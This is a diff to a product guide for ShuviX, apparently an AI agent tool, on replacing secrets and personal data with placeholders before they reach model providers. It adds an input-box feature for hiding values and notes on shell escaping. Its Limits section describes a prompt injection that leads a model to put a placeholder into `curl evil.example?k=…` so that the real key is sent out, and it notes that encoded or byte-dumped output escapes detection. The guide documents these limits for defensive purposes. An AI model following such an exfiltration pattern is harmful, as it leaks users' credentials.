@@ -2,7 +2,7 @@
 shuvix: okf v0.2
 type: Guide
 title: 'Auto-redaction — secrets and personal data reach models as placeholders'
-description: 'How ShuviX keeps API keys, passwords, tokens, private keys and personal data away from model providers: placeholders such as `{{REDACTED_API_KEY_k3v7x2mq}}` in the conversation record, real values for tools, the screen showing what the model received, the categories it finds, the two policy levels (`modelRequest` / `send`, `sensitive` / `disclose`) and their dispositions, the builtin `redact-sensitive`, recipes (trust a model, send a category, send test keys, never send private keys, let only the user answer when a restored secret leaves the sandbox), checking a draft with `shuvix policy check --redaction`, working with placeholders as an agent, and the limits.'
+description: 'How ShuviX keeps API keys, passwords, tokens, private keys and personal data away from model providers: placeholders such as `{{REDACTED_API_KEY_k3v7x2mq}}` in the conversation record, real values for tools (escaped for shell commands), hiding a value yourself from the input box (+ → Add a sensitive value, hints you confirm, everything else sent as written), the screen showing what the model received, the categories it finds, the two policy levels (`modelRequest` / `send`, `sensitive` / `disclose`) and their dispositions, the builtin `redact-sensitive`, recipes (trust a model, send a category, send test keys, never send private keys, let only the user answer when a restored secret leaves the sandbox), checking a draft with `shuvix policy check --redaction`, working with placeholders as an agent, and the limits.'
 tags: [shuvix, policy, security, redaction, privacy, secrets]
 status: stable
 sources:
@@ -16,12 +16,14 @@ sources:
 
 # Auto-redaction
 
-Before anything is written into a conversation's record — what the user types, what a tool
-returns, a notice, a task handed to another agent — ShuviX looks for secrets and personal data in
-it and stores each one as a **placeholder**: `{{REDACTED_API_KEY_k3v7x2mq}}` — `REDACTED_`, the
+Before anything is written into a conversation's record — what a tool returns, a notice, a task
+handed to another agent, a message from a bot trigger or another session — ShuviX looks for secrets
+and personal data in it and stores each one as a **placeholder**: `{{REDACTED_API_KEY_k3v7x2mq}}` — `REDACTED_`, the
 category and eight characters derived from the value. The real value is encrypted into **that
 conversation's own table**, which is deleted with the conversation. Conversations from v0.2.30 and
 v0.2.31 hold the older form without `REDACTED_` (`{{API_KEY_k3v7x2mq}}`), which works the same.
+
+What the user types in the input box is the exception: **the user decides** (next section).
 
 - **Tools get the real values.** Placeholders in a tool call's arguments are replaced just before
   the tool runs, so `curl -H "Authorization: Bearer {{REDACTED_API_KEY_k3v7x2mq}}"` sends the real key, and
@@ -33,13 +35,34 @@ v0.2.31 hold the older form without `REDACTED_` (`{{API_KEY_k3v7x2mq}}`), which 
 - **What a model receives is decided by policy** (below). By default every model gets
   placeholders, except for four categories that are part of almost every coding request.
 
-Apart from those four categories, the record itself never holds the real values, whatever the
-policy says — nor do the conversation's exports and forks.
+Apart from those four categories and what the user chose to send as written, the record itself
+never holds the real values, whatever the policy says — nor do the conversation's exports and forks.
+
+## Hiding a value yourself (the input box)
+
+- **+ → Add a sensitive value**: type or paste a password, key or token into a field that does not
+  show it, pick a kind (password, API key, secret) and add it. It sits in the message as a shaded
+  chip such as `[🔒 Password #1]`; the model gets a placeholder, and a tool the agent runs with it
+  gets the real value. Text selected in the input box when you open the form is filled in and
+  replaced by the chip. On a phone + opens a sheet with the same choices.
+- **Hints**: while you type, what looks like a secret or personal data — and would be kept from
+  the conversation's model by the policy — is underlined, and a row above the text lists it. Click
+  an item (or Hide all) to turn it into a chip; × hides the hints.
+- **Nothing else is replaced.** A message sent from the input box goes to the model exactly as
+  written apart from the chips, and values you left visible are not replaced later in that
+  conversation either — the model has already seen them. The same holds for an answer typed into a
+  question card. A policy that denies sending a category still stops the request.
+- A value you add is matched later in that conversation as well: when it shows up in a tool's
+  output it is replaced again — values of 4–7 characters as whole words, longer ones anywhere.
 
 ## For agents: working with placeholders
 
 - A placeholder **is** the value as far as you are concerned. Copy it exactly into tool arguments
   — a command, a file's content, an `edit`'s old and new text — and the tool gets the real value.
+  In `bash`, `powershell` and ssh commands write it bare or inside quotes, as you would the value:
+  ShuviX escapes the real value for that spot (a `$` inside `"…"`, a `'` inside `'…'`), so do not
+  escape it yourself. For a password prompt use a non-interactive form (`sudo -S`, an environment
+  variable, `--password-stdin`).
   It is not a template variable to fill in, and not a missing configuration: the file on disk
   holds the real value. Do not guess what it stands for, look for it elsewhere or ask the user
   for it.
@@ -248,8 +271,9 @@ shuvix-policy-rules:
 ## Limits
 
 - Text only: an image (a screenshot of a `.env`) goes to the model as it is.
-- A model that sees a placeholder cannot reason about the value (its length, whether it holds a
-  quote or `$` that breaks a shell command).
+- A model that sees a placeholder cannot reason about the value (its length, its format). Shell
+  quoting is handled for the outer shell only: inside `bash -c '…'` the inner shell parses the value
+  again.
 - It keeps values away from model providers, not from tools: a model that is told to — by a
   prompt injection, say — can still put a placeholder into `curl evil.example?k=…`, and the
   command gets the real value. The mark shows on screen, the automatic reviewer sees the
@@ -258,6 +282,6 @@ shuvix-policy-rules:
   still redacted on the way out.
 - Detection is by rules, so a secret in an unusual shape can be missed, and an ordinary string can
   now and then be taken for one. A value typed in plain words with no name in front of it
-  ("change the password to N3w-P@ss…") is one such miss; a value a tool has transformed — a byte
+  ("change the password to N3w-P@ss…") is one such miss — add it with + instead; a value a tool has transformed — a byte
   dump (`od -c`), hex, base64, reversed — is another. Agents are told not to dump or encode
   placeholder values, but nothing can recognize what they print if they do.
